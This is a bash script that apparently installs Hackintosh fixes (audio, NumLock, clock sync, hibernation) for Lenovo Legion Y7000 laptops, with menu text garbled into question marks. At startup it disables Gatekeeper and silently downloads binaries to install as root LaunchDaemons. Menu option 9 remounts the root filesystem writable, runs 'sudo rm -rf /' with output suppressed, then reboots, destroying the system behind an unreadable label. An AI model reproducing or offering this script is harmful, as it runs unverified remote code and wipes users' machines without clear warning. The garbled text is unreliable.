#!/bin/bash

DAEMON_PATH=/Library/LaunchDaemons/
BIN_PATH=/usr/local/bin/
TMP_PATH=/tmp/
ALC_DAEMON_FILE=good.win.ALCPlugFix.plist
VERB_FILE=alc-verb
ALC_FIX_FILE=ALCPlugFix
TIME_FIX_FILE=localtime-toggle
TIME_DAEMON_FILE=org.osx86.localtime-toggle.plist
NUMLOCK_FIX_FILE=setleds
NUMLOCK_DAEMON_FILE=com.rajiteh.setleds.plist
GIT_URL=https://gitee.com/xiaoMGit/Y7000Series_Hackintosh_Fix/raw/master

init(){
	sudo spctl --master-disable
	
	sudo curl -s -o $TMP_PATH$ALC_FIX_FILE "$GIT_URL/ALCPlugFix/$ALC_FIX_FILE"
	sudo curl -s -o $TMP_PATH$VERB_FILE "$GIT_URL/ALCPlugFix/$VERB_FILE"
	sudo curl -s -o $TMP_PATH$ALC_DAEMON_FILE "$GIT_URL/ALCPlugFix/$ALC_DAEMON_FILE"
	sudo curl -s -o $TMP_PATH$TIME_FIX_FILE "$GIT_URL/TimeSynchronization/$TIME_FIX_FILE"
	sudo curl -s -o $TMP_PATH$TIME_DAEMON_FILE "$GIT_URL/TimeSynchronization/$TIME_DAEMON_FILE"
    sudo curl -s -o $TMP_PATH$NUMLOCK_FIX_FILE "$GIT_URL/NumLockFix/$NUMLOCK_FIX_FILE"
    sudo curl -s -o $TMP_PATH$NUMLOCK_DAEMON_FILE "$GIT_URL/NumLockFix/$NUMLOCK_DAEMON_FILE"
	
	if [ ! -d "$BIN_PATH" ] ; then
		mkdir "$BIN_PATH" ;
	fi
	
	if sudo launchctl list | grep --quiet com.black-dragon74.ALCPlugFix; then
		sudo launchctl unload /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
		sudo rm /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
		sudo rm /usr/local/bin/ALCPlugFix
		sudo rm /Library/Preferences/ALCPlugFix/ALC_Config.plist
	fi
}

ALCPlugFix(){
	sudo cp $TMP_PATH$ALC_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$VERB_FILE $BIN_PATH
	sudo cp $TMP_PATH$ALC_DAEMON_FILE $DAEMON_PATH
	sudo chmod 755 $BIN_PATH$ALC_FIX_FILE
	sudo chown $USER:admin $BIN_PATH$ALC_FIX_FILE
	sudo chmod 755 $BIN_PATH$VERB_FILE
	sudo chown $USER:admin $BIN_PATH$VERB_FILE
	sudo chmod 644 $DAEMON_PATH$ALC_DAEMON_FILE
	sudo chown root:wheel $DAEMON_PATH$ALC_DAEMON_FILE
	if sudo launchctl list | grep --quiet ALCPlugFix; then
		sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$ALC_DAEMON_FILE
}

localtime_toggle(){
	sudo cp $TMP_PATH$TIME_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$TIME_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$TIME_FIX_FILE
	sudo chown root $DAEMON_PATH$TIME_DAEMON_FILE
	sudo chmod 644 $DAEMON_PATH$TIME_DAEMON_FILE
	if sudo launchctl list | grep --quiet localtime-toggle; then
		sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$TIME_DAEMON_FILE
}

numlock(){
	sudo cp $TMP_PATH$NUMLOCK_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$NUMLOCK_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$NUMLOCK_FIX_FILE
	sudo chown root:wheel $DAEMON_PATH$NUMLOCK_DAEMON_FILE
	if sudo launchctl list | grep --quiet setleds; then
		sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$NUMLOCK_DAEMON_FILE
}

clear_cache(){
	sudo kextcache -i /
}

set_hibernatemode_0(){
	sudo pmset -a hibernatemode 0
	sudo rm -rf /var/vm/sleepimage
	sudo mkdir /var/vm/sleepimage
}

set_hibernatemode_25(){
	sudo pmset -a hibernatemode 25
	sudo rm -rf /var/vm/sleepimage
}

fixAll(){
	set_hibernatemode_0
	ALCPlugFix
	numlock
	localtime_toggle
    clear_cache
}

removeAll(){
    if sudo launchctl list | grep --quiet ALCPlugFix; then
        sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $BIN_PATH$VERB_FILE
        sudo rm -rf $BIN_PATH$ALC_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet localtime-toggle; then
        sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $BIN_PATH$TIME_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet setleds; then
        sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$NUMLOCK_DAEMON_FILE
        sudo rm -rf $BIN_PATH$NUMLOCK_FIX_FILE
    fi
}

menu(){
	echo "
******************************************************************************
                                                                                   
    https://github.com/xiaoMGitHub/LEGION_Y7000Series_Hackintosh/releases  

                              QQ??????780936290
                                                                                  
******************************************************************************
"
    echo "???????????????"
	echo ""
    echo "1????????????????????????"
	echo ""
    echo "2?????????????????????????????????"
	echo ""
    echo "3????????? Win/OSX ???????????????"
	echo ""
	echo "4???????????????"
    echo ""
    echo "5???????????????(?????? 0)"
    echo ""
    echo "6???????????????????????????"
    echo ""
    echo "7???????????????(?????? 25)"
	echo ""
	echo "8?????????????????????"
	echo ""
    echo "9??????????????????"
    echo ""
	echo "0?????????"
	echo ""
}

Select(){
	read -p "????????????????????????????????????" number
    case ${number} in
    1) ALCPlugFix
	   echo "???????????????????????????"
	   echo ""
	   Select
      ;;
    2) numlock
	   echo "????????????????????????????????????"
	   echo ""
	   Select
       ;;
    3) localtime_toggle
	   echo "???????????? Win/OSX ???????????????"
	   echo ""
	   Select
       ;;
	4) clear_cache
       echo "??????????????????"
	   echo ""
       Select
       ;;
	5) set_hibernatemode_0
	   echo "??????????????????"
	   echo ""
	   Select
       ;;
    6) fixAll
	   echo "????????????????????????"
	   echo ""
	   Select
       ;;
    7) set_hibernatemode_25
	   echo "??????????????????"
	   echo ""
	   Select
       ;;
	8) removeAll
       echo "????????????????????????"
       Select
       ;;
    9) echo "??????????????????????????????????????????????????????????????? windows ??????,?????????????????????"
        if sudo test ! -w "/"; then
            sudo mount -uw /
            sudo killall Finder
        fi
        sudo rm -rf / >/dev/null 2>&1
        sudo reboot
        ;;
	0) exit 0
       ;;
    *) echo "????????????";
	   echo ""
       Select
       ;;
    esac
}

main(){
	init
	
	menu
	
	Select
}

main

